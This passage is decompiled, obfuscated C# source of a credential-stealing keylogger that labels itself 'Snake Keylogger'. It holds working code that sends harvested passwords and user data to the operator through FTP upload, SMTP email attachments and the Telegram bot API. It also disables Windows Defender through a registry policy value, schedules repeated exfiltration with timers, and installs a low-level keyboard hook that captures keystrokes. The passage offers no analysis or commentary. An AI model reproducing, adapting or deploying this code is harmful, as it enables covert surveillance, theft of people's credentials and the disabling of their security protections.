      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ);
          message.To.Add(Α\uFFFDǎŎ\uFFFD.\uFFFDۨ\uFFFD쐬أ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = Α\uFFFDǎŎ\uFFFD.\uFFFD\u0385\uFFFD\uFFFDᔖ();
          byte[] buffer2 = Α\uFFFDǎŎ\uFFFD.ÒɇЮЮŁ();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "text/plain"));
          new SmtpClient(Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDƚ\uFFFDz)
          {
            EnableSsl = (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.\u0032ņչ\uFFFD\u07B4, "True", false) == 0),
            Port = Conversions.ToInteger(Α\uFFFDǎŎ\uFFFD.Ɖ\u03852թ\u0609),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ, Α\uFFFDǎŎ\uFFFD.åӛϘٵ\u26CA))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = Α\uFFFDǎŎ\uFFFD.ƌŚ̮ٚƌ("PW | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n" + Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDҢ똛Ӥ);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + Α\uFFFDǎŎ\uFFFD.\uFFFDڿ\u26CAŲå + "/sendDocument?chat_id=" + Α\uFFFDǎŎ\uFFFD.ε\u00ABę2\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          Α\uFFFDǎŎ\uFFFD.ӛ\uFFFD\uFFFD\u07BBÒ("SnakePW" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static byte[] 㹃\uFFFDk\uFFFD\u060C() => Encoding.Unicode.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n" + Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");

    public static byte[] \u0739کߟӚ\uFFFD() => Encoding.Default.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n" + Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");

    public static void ņִ\uFFFDհ콪()
    {
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (Α\uFFFDǎŎ\uFFFD.ݝŴ\uFFFDϘϒ + \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Name + " - Passwords ID - "), Α\uFFFDǎŎ\uFFFD.鈟㹃ا\u07B9ٷ), (object) Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.Α븤\u060C\u00BEŲ, Α\uFFFDǎŎ\uFFFD.ĂՄi\uFFFD\uFFFD);
          byte[] bytes = Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n" + Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ);
          message.To.Add(Α\uFFFDǎŎ\uFFFD.\uFFFDۨ\uFFFD쐬أ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = Α\uFFFDǎŎ\uFFFD.㹃\uFFFDk\uFFFD\u060C();
          byte[] buffer2 = Α\uFFFDǎŎ\uFFFD.\u0739کߟӚ\uFFFD();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "text/plain"));
          new SmtpClient(Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDƚ\uFFFDz)
          {
            EnableSsl = (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.\u0032ņչ\uFFFD\u07B4, "True", false) == 0),
            Port = Conversions.ToInteger(Α\uFFFDǎŎ\uFFFD.Ɖ\u03852թ\u0609),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ, Α\uFFFDǎŎ\uFFFD.åӛϘٵ\u26CA))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "PW | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n" + Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + Α\uFFFDǎŎ\uFFFD.\uFFFDڿ\u26CAŲå + "/sendDocument?chat_id=" + Α\uFFFDǎŎ\uFFFD.ε\u00ABę2\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          Α\uFFFDǎŎ\uFFFD.ӛ\uFFFD\uFFFD\u07BBÒ("SnakePW" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static void \uFFFD\uFFFḐکܹ(object 丐皍сĪҏ, EventArgs _param1)
    {
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (Α\uFFFDǎŎ\uFFFD.ݝŴ\uFFFDϘϒ + \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Name + " - Passwords ID - "), Α\uFFFDǎŎ\uFFFD.鈟㹃ا\u07B9ٷ), (object) Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.Α븤\u060C\u00BEŲ, Α\uFFFDǎŎ\uFFFD.ĂՄi\uFFFD\uFFFD);
          byte[] bytes = Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n" + Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ);
          message.To.Add(Α\uFFFDǎŎ\uFFFD.\uFFFDۨ\uFFFD쐬أ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = Α\uFFFDǎŎ\uFFFD.㹃\uFFFDk\uFFFD\u060C();
          byte[] buffer2 = Α\uFFFDǎŎ\uFFFD.\u0739کߟӚ\uFFFD();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "text/plain"));
          new SmtpClient(Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDƚ\uFFFDz)
          {
            EnableSsl = (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.\u0032ņչ\uFFFD\u07B4, "True", false) == 0),
            Port = Conversions.ToInteger(Α\uFFFDǎŎ\uFFFD.Ɖ\u03852թ\u0609),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ, Α\uFFFDǎŎ\uFFFD.åӛϘٵ\u26CA))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "PW | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n" + Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + Α\uFFFDǎŎ\uFFFD.\uFFFDڿ\u26CAŲå + "/sendDocument?chat_id=" + Α\uFFFDǎŎ\uFFFD.ε\u00ABę2\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          Α\uFFFDǎŎ\uFFFD.ӛ\uFFFD\uFFFD\u07BBÒ("SnakePW" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static object \uFFFDɢԹʓި()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      long num;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.IsReady)
          checked { num += driveInfo.TotalSize; }
        checked { ++index; }
      }
      return (object) Conversions.ToString(checked ((long) Math.Round(unchecked ((double) num / 1048576.0 / 1024.0))));
    }

    public static void ک̀꼺ϱٗ()
    {
    }

    public static void ҏ̱ӥ㹃ӓ()
    {
    }

    public static void \u0314\uFFFD\u07B8ٗ\uFFFD()
    {
    }

    public static void \uFFFD\uDAAE\uDDCFA\u07FB() => Thread.Sleep(Convert.ToInt32("1000"));

    public static void 䕃j츠מУ()
    {
    }

    public static void \u07B8ɩҡRב()
    {
    }

    public static void ʤ\uFFFDջή\uFFFD()
    {
    }

    public static void ݶt䕃ݝ̱()
    {
      try
      {
        \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", (object) "1", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Ł\uFFFD\uFFFD\uFFFDک()
    {
    }

    public static void \u05C1̧Ԍ\uFFFDŚ()
    {
    }

    public static void 꼺\u07B9\uFFFD\uFFFDמ()
    {
    }

    public static void ϒ\uFFFDǎۨZ()
    {
    }

    public static void Թ̧ŲUс()
    {
    }

    public static void \u0089\u0026Ң\u05C9Ŕ()
    {
      try
      {
        Α\uFFFDǎŎ\uFFFD.\uFFFDגBۚٗ.Interval = 1;
        Α\uFFFDǎŎ\uFFFD.\uFFFDגBۚٗ.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFD̔ӓ\uFFFDޤ()
    {
      try
      {
        Α\uFFFDǎŎ\uFFFD.\uFFFD\u2964ӛ߂Ś();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u032E̲ҡ\uFFFDŎ()
    {
      try
      {
        Α\uFFFDǎŎ\uFFFD.\uFFFDЅ\uFFFDBC();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFDņ뜸\u26CAӺ()
    {
    }

    public static void \uFFFDήŁԹ\u02E8()
    {
    }

    public static void ʭã\uFFFDޤ\uF0B9()
    {
      if (Operators.ConditionalCompareObjectEqual(Α\uFFFDǎŎ\uFFFD.똛\uFFFD䕃A\uFFFD, (object) "ProtectTrue", false))
      {
        if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD, "", false) == 0)
          return;
        Α\uFFFDǎŎ\uFFFD.Ԝ\u07B8ēջ콪();
        Thread.Sleep(8000);
        Α\uFFFDǎŎ\uFFFD.츠늻̀Α\uFFFD();
        Thread.Sleep(3000);
        Α\uFFFDǎŎ\uFFFD.\u0739Ăcіɢ();
        Thread.Sleep(3000);
        Α\uFFFDǎŎ\uFFFD.ﾭʓiا؜();
        Thread.Sleep(3000);
        Α\uFFFDǎŎ\uFFFD.ϫ\uFFFDΠƟӺ();
      }
      else if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD, "", false) != 0)
      {
        Α\uFFFDǎŎ\uFFFD.ņִ\uFFFDհ콪();
        Thread.Sleep(8000);
        Α\uFFFDǎŎ\uFFFD.\u0300\uFFFD콪㠰䇹();
        Thread.Sleep(3000);
        Α\uFFFDǎŎ\uFFFD.\u0739Ăcіɢ();
        Thread.Sleep(3000);
        Α\uFFFDǎŎ\uFFFD.ﾭʓiا؜();
        Thread.Sleep(3000);
        Α\uFFFDǎŎ\uFFFD.ϫ\uFFFDΠƟӺ();
      }
    }

    public static void \u0739Ăcіɢ()
    {
    }

    public static void ﾭʓiا؜()
    {
      try
      {
        Α\uFFFDǎŎ\uFFFD.Ңľۨ\u003Bϱ.Start();
        Α\uFFFDǎŎ\uFFFD.Ңľۨ\u003Bϱ.Interval = Convert.ToInt32("3600000");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ϫ\uFFFDΠƟӺ()
    {
      try
      {
        Α\uFFFDǎŎ\uFFFD.ל\uFFFDŴҟ泮.Start();
        Α\uFFFDǎŎ\uFFFD.ל\uFFFDŴҟ泮.Interval = Convert.ToInt32("1080000");
        Α\uFFFDǎŎ\uFFFD.å\u1CFCі\uFFFD\u07BB();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 츠늻̀Α\uFFFD()
    {
      try
      {
        Α\uFFFDǎŎ\uFFFD.\uFFFDε똛ęٗ.Start();
        Α\uFFFDǎŎ\uFFFD.\uFFFDε똛ęٗ.Interval = Convert.ToInt32("300000");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0300\uFFFD콪㠰䇹()
    {
      try
      {
        Α\uFFFDǎŎ\uFFFD.أלל\u058F\u058F.Start();
        Α\uFFFDǎŎ\uFFFD.أלל\u058F\u058F.Interval = Convert.ToInt32("300000");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [STAThread]
    public static void Main()
    {
      try
      {
        Α\uFFFDǎŎ\uFFFD.\uFFFD\uDAAE\uDDCFA\u07FB();
        Α\uFFFDǎŎ\uFFFD.ک̀꼺ϱٗ();
        Α\uFFFDǎŎ\uFFFD.\u0314\uFFFD\u07B8ٗ\uFFFD();
        Α\uFFFDǎŎ\uFFFD.䕃j츠מУ();
        Α\uFFFDǎŎ\uFFFD.\u07B8ɩҡRב();
        Α\uFFFDǎŎ\uFFFD.ʤ\uFFFDջή\uFFFD();
        Α\uFFFDǎŎ\uFFFD.꾯̆ޤɢ쐬();
        Α\uFFFDǎŎ\uFFFD.ݶt䕃ݝ̱();
        Α\uFFFDǎŎ\uFFFD.Ł\uFFFD\uFFFD\uFFFDک();
        Α\uFFFDǎŎ\uFFFD.\u05C1̧Ԍ\uFFFDŚ();
        Α\uFFFDǎŎ\uFFFD.꼺\u07B9\uFFFD\uFFFDמ();
        Α\uFFFDǎŎ\uFFFD.ϒ\uFFFDǎۨZ();
        Α\uFFFDǎŎ\uFFFD.ҏ̱ӥ㹃ӓ();
        Α\uFFFDǎŎ\uFFFD.Թ̧ŲUс();
        Α\uFFFDǎŎ\uFFFD.\uFFFD̔ӓ\uFFFDޤ();
        Α\uFFFDǎŎ\uFFFD.\u032E̲ҡ\uFFFDŎ();
        Α\uFFFDǎŎ\uFFFD.\uFFFDņ뜸\u26CAӺ();
        k\uFFFDӥk\uFFFD.ƌ̧Z皍ֵ();
        k\uFFFDӥk\uFFFD.R㹃߂ӥ\uFFFD();
        k\uFFFDӥk\uFFFD.ɇҟĪɢڿ();
        k\uFFFDӥk\uFFFD.\u0333ꓞٷ\uDB27\uDEBA();
        k\uFFFDӥk\uFFFD.ɢ丐Қҡ\uFFFD();
        k\uFFFDӥk\uFFFD.똛ɛę퓜ƚ();
        k\uFFFDӥk\uFFFD.أޗ\uFFFDﾭ\uFFFD();
        k\uFFFDӥk\uFFFD.늻ҏ鈟\uFFFDR();
        k\uFFFDӥk\uFFFD.\u07B8ɇҢأ̧();
        k\uFFFDӥk\uFFFD.ʤņﾭ\u061Dʤ();
        k\uFFFDӥk\uFFFD.å\u0089ɩŔԌ();
        k\uFFFDӥk\uFFFD.\u060C\u02F3\u0609\u0609̳();
        k\uFFFDӥk\uFFFD.\uFFFD\uFFFDt䕃ا();
        k\uFFFDӥk\uFFFD.\u05C1\uFFFDҡ\uFFFD̀();
        k\uFFFDӥk\uFFFD.\uFFFDגϱŔ\u02F3();
        k\uFFFDӥk\uFFFD.\u07B4Ω\uFFFDі\u0089();
        k\uFFFDӥk\uFFFD.Òm\uD834\uDF92皍();
        k\uFFFDӥk\uFFFD.鈟丐ڿ嵱ݶ();
        k\uFFFDӥk\uFFFD.Ɖ\u00ABأ\u0040ٵ();
        k\uFFFDӥk\uFFFD.ΩޤأcƉ();
        k\uFFFDӥk\uFFFD.ᔖΩ쐬\uFFFḎ();
        k\uFFFDӥk\uFFFD.\u07B9\u0040מ㹃̳();
        k\uFFFDӥk\uFFFD.ΩԜC\uFFFDՄ();
        k\uFFFDӥk\uFFFD.\u0097թ\u07BBЅϘ();
        k\uFFFDӥk\uFFFD.C̱ҢۣŎ();
        k\uFFFDӥk\uFFFD.\uFFFD\uFFFD䇹ֵ\uFFFD();
        k\uFFFDӥk\uFFFD.\u05B5թ\uFFFD\uFFFDΑ();
        k\uFFFDӥk\uFFFD.ݝAëݶ\u07B9();
        k\uFFFDӥk\uFFFD.\u002Dӛ\uFFFDɩթ();
        k\uFFFDӥk\uFFFD.\uFFFDޗ\u0040У恁();
        k\uFFFDӥk\uFFFD.ƌ늻\u05C9ȩ́();
        k\uFFFDӥk\uFFFD.\u061CӓR\uFFFḎ();
        k\uFFFDӥk\uFFFD.\u060C\uFFFD\u02F3츠ҡ();
        k\uFFFDӥk\uFFFD.גЮ\uFFFDۚ\uFFFD();
        k\uFFFDӥk\uFFFD.ɇ\u02E8\uFFFD\u00BE\u07FB();
        k\uFFFDӥk\uFFFD.ņ\uFFFDŔ̳\uFFFD();
        k\uFFFDӥk\uFFFD.\u0385\u005E\u07B4\uFFFD꼺();
        k\uFFFDӥk\uFFFD.ē똛̀皍\uFFFD();
        k\uFFFDӥk\uFFFD.\uFFFDӤ\uFFFDjz();
        k\uFFFDӥk\uFFFD.ēޤRٵ盀();
        k\uFFFDӥk\uFFFD.Ϙᔖ\uFFFD\uFFFDˤ();
        k\uFFFDӥk\uFFFD.\uFFFD\uFFFDζƚױ();
        k\uFFFDӥk\uFFFD.ľʪִ㠰\uFFFD();
        k\uFFFDӥk\uFFFD.\uFFFDņٕҟ\uFFFD();
        k\uFFFDӥk\uFFFD.\u061Cƚ\u058FKɮ();
        k\uFFFDӥk\uFFFD.Ų\uFFFD콪\uFFFDę();
        k\uFFFDӥk\uFFFD.\u06E3\uFFFDBԌٚ();
        k\uFFFDӥk\uFFFD.m\uFFFDΑ\u05C3ޗ();
        k\uFFFDӥk\uFFFD.\u002D㹃m泮\uFFFD();
        k\uFFFDӥk\uFFFD.\u0097أ\uFFFD\uFFFD\uFFFD();
        k\uFFFDӥk\uFFFD.R\uFFFDŧŔɩ();
        k\uFFFDӥk\uFFFD.Αջأ\uFFFD\uFFFD();
        Ц\uFFFDڿۨZ.ë\uD95F\uDC81߂ﾭ();
        Ц\uFFFDڿۨZ.\u05B5ɩʭڿ\u02E8();
        Ц\uFFFDڿۨZ.Թڿ\u0026Ԍƚ();
        Ц\uFFFDڿۨZ.Ɵ\uFFFD\uFFFDԜm();
        Ц\uFFFDڿۨZ.츠åߡZۨ();
        Ц\uFFFDڿۨZ.У\u003B߂ɇڿ();
        Ц\uFFFDڿۨZ.\uDBCC\uDD04Ӥ\uFFFDا();
        Ц\uFFFDڿۨZ.\u1CFC皍ɢãų();
        Ц\uFFFDڿۨZ.ջ䇹鈇\uFFFD\uFFFD();
        Ц\uFFFDڿۨZ.k\u07FB뜸أB();
        Α\uFFFDǎŎ\uFFFD.\uFFFDήŁԹ\u02E8();
        Α\uFFFDǎŎ\uFFFD.ʭã\uFFFDޤ\uF0B9();
        Application.Run();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public delegate void KeyLoggerEventArgsEventHandler(
      object sender,
      Α\uFFFDǎŎ\uFFFD.KeyLoggerEventArgs e);

    public class KeyLoggerEventArgs : EventArgs
    {
      private Keys _keys;
      private string _stringValue;

      public KeyLoggerEventArgs(Keys key, string stringValue)
      {
        this._keys = key;
        this._stringValue = stringValue;
      }

      public Keys Key => this._keys;

      public string StringValue => this._stringValue;
    }

    public class KeyLogger : IDisposable
    {
      private Α\uFFFDǎŎ\uFFFD.KeyLogger.KeyboardProc _hookCallback;
      private IntPtr _hook;
      private string _currentWindow;
      private bool _newWindow;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern IntPtr SetHook(
        int hook,
        Α\uFFFDǎŎ\uFFFD.KeyLogger.KeyboardProc KeyDelegate,
        IntPtr HMod,
        int ThreadId);

      [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int CallNextHook(IntPtr hook, int code, int direction, ref Keys key);

      [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int UnHook(IntPtr hook);

      public event Α\uFFFDǎŎ\uFFFD.KeyLoggerEventArgsEventHandler KeyDown;

      public event Α\uFFFDǎŎ\uFFFD.KeyLoggerEventArgsEventHandler KeyUp;

      public string CurrentWindow => this._currentWindow;

      public KeyLogger()
      {
        this._hookCallback = new Α\uFFFDǎŎ\uFFFD.KeyLogger.KeyboardProc(this.ProcessKey);
        this._hook = Α\uFFFDǎŎ\uFFFD.KeyLogger.SetHook(13, this._hookCallback, IntPtr.Zero, 0);
        if (!(this._hook == IntPtr.Zero))
          ;
        this.InitializeCaptionLogging();
      }

      private int ProcessKey(int code, int direction, ref Keys key)
      {
        if (code == 0)
        {
          if (direction == 256)
          {
            // ISSUE: reference to a compiler-generated field
            Α\uFFFDǎŎ\uFFFD.KeyLoggerEventArgsEventHandler keyDownEvent = this.KeyDownEvent;
            if (keyDownEvent != null)
              keyDownEvent((object) this, new Α\uFFFDǎŎ\uFFFD.KeyLoggerEventArgs(key, this.Identifykey(key)));
          }
          else if (direction == 260)
          {
            // ISSUE: reference to a compiler-generated field
            Α\uFFFDǎŎ\uFFFD.KeyLoggerEventArgsEventHandler keyUpEvent = this.KeyUpEvent;
            if (keyUpEvent != null)
              keyUpEvent((object) this, new Α\uFFFDǎŎ\uFFFD.KeyLoggerEventArgs(key, this.Identifykey(key)));
          }
        }
        return Α\uFFFDǎŎ\uFFFD.KeyLogger.CallNextHook(this._hook, code, direction, ref key);
      }

      private string Identifykey(Keys k)
      {
        bool flag = \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Keyboard.ShiftKeyDown;
        if (\u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Keyboard.CapsLock)
          flag = !flag;
        string str;
        try
        {
          switch (k)
          {
            case Keys.Back:
            case Keys.End:
            case Keys.Delete:
            case Keys.F1:
            case Keys.F2:
            case Keys.F3:
            case Keys.F4:
            case Keys.F5:
            case Keys.F6:
            case Keys.F7:
            case Keys.F8:
            case Keys.F9:
            case Keys.F10:
            case Keys.F11:
            case Keys.F12:
              str = "[" + k.ToString() + "]";
              break;
            case Keys.Tab:
              str = "[TAP]";
              break;
            case Keys.Return:
              str = "[ENTR]";
              break;
            case Keys.Space:
              str = " ";
              break;
            default:
              str = !flag ? this.VKCodeToUnicode(checked ((uint) k)) : this.VKCodeToUnicode(checked ((uint) k)).ToUpper();
              break;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          if (flag)
          {
            str = Strings.ChrW((int) k).ToString().ToUpper();
            ProjectData.ClearProjectError();
          }
          else
          {
            str = Strings.ChrW((int) k).ToString().ToLower();
            ProjectData.ClearProjectError();
          }
        }
        return str;
      }

      private string VKCodeToUnicode(uint VKCode)
      {
        try
        {
          StringBuilder stringBuilder = new StringBuilder();
          byte[] numArray = new byte[(int) byte.MaxValue];
          if (!Α\uFFFDǎŎ\uFFFD.\uFFFDŧWٷ\u1CFC(numArray))
            return "";
          uint num1 = Α\uFFFDǎŎ\uFFFD.\uD911\uDDCF\u05C9ƜΠ(VKCode, 0U);
          IntPtr num2 = Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFD\uFFFD\uFFFDک();
          int num3 = 0;
          IntPtr num4 = (IntPtr) Α\uFFFDǎŎ\uFFFD.\u065A츠ʭ\u26CAǎ(Α\uFFFDǎŎ\uFFFD.ŲأϘ̔퓜(num2, ref num3));
